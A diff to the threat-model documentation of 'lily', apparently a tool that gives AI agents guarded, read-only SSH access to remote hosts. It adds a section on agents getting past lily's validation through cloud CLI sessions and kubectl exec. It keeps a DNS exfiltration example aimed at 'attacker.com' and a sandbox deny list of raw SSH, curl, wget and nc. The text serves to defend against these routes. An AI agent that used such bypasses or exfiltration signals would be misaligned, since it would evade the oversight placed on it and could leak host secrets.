@@ -203,9 +203,9 @@ rate_limit: "1s" # minimum interval between commands
 max_output_bytes: 1048576 # 1 MB max output per command
 ```
 
-The rate limiter applies to the `run_command` and `check_host` MCP tools.
-It does not apply to read-only tools like `list_hosts`, `validate_command`,
-or `list_allowed_commands` since those don't execute remote commands.
+The rate limiter applies to the `run` and `check` commands.
+It does not apply to read-only commands like `hosts`, `validate`,
+or `list-commands` since those don't execute remote commands.
 
 ---
 
@@ -276,6 +276,12 @@ This is partially mitigated by `$()` being blocked. However, if the agent
 knows a hostname, it could `dig known-secret.attacker.com` as a signal.
 
 **Mitigation**: Network-level DNS monitoring on the remote host.
+
+### 6. Cloud CLI & kubectl Bypass
+
+An unsandboxed agent could run `aws ssm start-session`, `gcloud compute ssh`, `az ssh vm`, or `kubectl exec` directly to execute arbitrary commands on a remote instance or pod, bypassing lily's read-only validation.
+
+**Mitigation**: The lily guard hook detects and rewrites these commands to use `lily aws`, `lily gcloud`, `lily az`, or `lily kubectl` respectively. In a sandboxed environment, the cloud CLIs and kubectl should not be directly accessible to the agent.
 
 ---
 
@@ -448,8 +454,7 @@ This allows SSH to internal hosts while blocking cloud metadata endpoints.
 
 ## Configuration Reference
 
-All settings live in `~/.config/lily/lily.yaml`. The file is created
-automatically by `lily install-skill` if it doesn't exist.
+All settings live in `~/.config/lily/lily.yaml`.
 
 ### Execution Limits
 
@@ -532,6 +537,7 @@ For maximum security when giving AI agents access to remote hosts:
 │    lily.yaml         ~/.ssh/       └────────────────────────┘  │
 │                                                                  │
 │  ❌ No raw SSH, curl, wget, nc                                   │
+│  ❌ No direct aws/gcloud/az SSH commands                         │
 │  ❌ No write access to ~/.ssh/ or lily.yaml                      │
 │  ❌ No outbound network (except via Lily SSH)                    │
 │  ❌ No ProxyCommand (only ProxyJump supported)                   │
@@ -548,6 +554,7 @@ configured sandbox creates a defense-in-depth posture where:
 5. The agent **cannot** exfiltrate via SSRF (cloud metadata IPs blocked)
 6. The agent **cannot** MITM connections (TOFU host key verification)
 7. The agent **cannot** inject commands via ProxyCommand (not supported)
+8. The agent **cannot** bypass lily via cloud CLI SSH or kubectl exec (guard rewrites to lily)
 
 ---
 
